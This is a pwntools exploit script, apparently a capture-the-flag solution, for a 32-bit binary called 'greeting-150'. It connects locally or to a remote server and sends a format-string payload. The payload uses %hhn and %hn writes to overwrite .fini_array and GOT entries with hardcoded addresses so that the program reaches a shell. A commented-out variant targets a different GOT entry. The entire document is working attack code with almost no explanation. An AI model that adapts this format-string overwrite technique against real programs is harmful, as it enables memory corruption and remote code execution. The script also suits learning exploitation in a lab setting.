from pwn import *
context.log_level = 'debug'

if len(sys.argv) == 1 or sys.argv[1] == 'l':
    p = process('./greeting-150')
    elf = ELF('./greeting-150')
else:
    p = remote('61.147.171.105', 51865)
    elf = ELF('./greeting-150') 
    pause()
p.recvuntil(b'name... ')
pause()
# 字符串起始位置对应第12个参数
fini_got=0x8049934
getlen_got=0x8049a54

nao_addr=0x8742
command=0x0804879C
# payload=b'aa'
# payload+=p32(fini_got)+p32(getlen_got+2)+p32(getlen_got)
# payload+=b'%205c%12$hhn%1815c%13$hn%31884c%14$hn'
payload=b'aa'
payload+=p32(fini_got)+p32(command)+p32(command+2)
payload+=b'%205c%12$hhn%8071c%14$hn%16623c%13$hn'
print(len(payload))
p.sendline(payload)
p.recvuntil(b'name... ')
# p.sendline(b'/bin/sh\x00')

p.interactive()